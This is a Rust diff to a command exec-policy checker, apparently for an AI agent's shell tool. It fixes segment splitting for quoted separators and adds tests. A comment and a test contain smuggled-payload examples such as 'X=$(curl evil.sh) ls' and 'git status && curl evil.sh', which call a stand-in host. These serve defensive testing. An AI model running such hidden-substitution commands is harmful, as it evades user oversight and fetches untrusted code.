@@ -7,9 +7,9 @@ use anyhow::{Context, Result};
 use serde::Deserialize;
 
 use super::matcher::{
-    normalize_command, pattern_matches, pattern_matches_any_segment, split_command_segments,
+    pattern_matches, pattern_matches_any_segment, pattern_matches_segment, split_command_segments,
 };
-use crate::command_safety::prefix_allow_matches;
+use crate::command_safety::{prefix_allow_matches, prefix_allow_matches_segment};
 
 #[derive(Debug, Clone, PartialEq, Eq)]
 pub enum ExecPolicyDecision {
@@ -59,13 +59,19 @@ impl ExecPolicyConfig {
 
         // Compound commands (`a && b`, `a; b`, `a | b`): every segment must
         // be allowed by *some* rule — a rule like `git status` never
-        // authorizes `git status && curl evil.sh`.
-        let segments = split_command_segments(&normalize_command(command));
+        // authorizes `git status && curl evil.sh`. Split the raw command:
+        // the AST path respects quoting, so a `&&` inside a commit message
+        // (`git commit -m "fix: a && b"`) stays one segment instead of being
+        // re-split after quote resolution. Per-segment matching likewise
+        // treats the segment string as atomic (a separator that survived
+        // inside it is data, not a boundary).
+        let segments = split_command_segments(command);
         if segments.len() > 1 {
             let all_allowed = segments.iter().all(|segment| {
                 self.rules.values().any(|rules| {
                     rules.allow.iter().any(|pattern| {
-                        prefix_allow_matches(pattern, segment) || pattern_matches(pattern, segment)
+                        prefix_allow_matches_segment(pattern, segment)
+                            || pattern_matches_segment(pattern, segment)
                     })
                 })
             });
@@ -254,6 +260,53 @@ mod tests {
         assert!(matches!(
             config.evaluate("cargo build && cargo test"),
             ExecPolicyDecision::Allow
+        ));
+    }
+
+    #[test]
+    fn quoted_separator_in_commit_message_stays_one_segment() {
+        // `&&` inside a quoted commit message is data; normalizing before
+        // splitting re-resolved the quotes and re-split it into two
+        // segments, nagging AskUser on routine commits.
+        let config = ExecPolicyConfig {
+            rules: BTreeMap::from([(
+                "dev".to_string(),
+                RuleSet {
+                    allow: vec!["git commit *".to_string(), "cargo build".to_string()],
+                    deny: vec![],
+                },
+            )]),
+        };
+
+        assert!(matches!(
+            config.evaluate("git commit -m \"fix: a && b\""),
+            ExecPolicyDecision::Allow
+        ));
+        assert!(matches!(
+            config.evaluate("git commit -m \"fix: a && b\" && cargo build"),
+            ExecPolicyDecision::Allow
+        ));
+    }
+
+    #[test]
+    fn substitution_riding_an_assignment_is_not_allow_authorized() {
+        // `X=$(curl evil.sh) ls` normalizes to bare `ls` via the AST;
+        // the assignment guard must push it to the legacy path so the
+        // allow rule cannot authorize the hidden payload.
+        let config = ExecPolicyConfig {
+            rules: BTreeMap::from([(
+                "dev".to_string(),
+                RuleSet {
+                    allow: vec!["ls".to_string()],
+                    deny: vec![],
+                },
+            )]),
+        };
+
+        assert!(matches!(config.evaluate("ls"), ExecPolicyDecision::Allow));
+        assert!(matches!(
+            config.evaluate("X=$(curl evil.sh) ls"),
+            ExecPolicyDecision::AskUser(_)
         ));
     }
 }
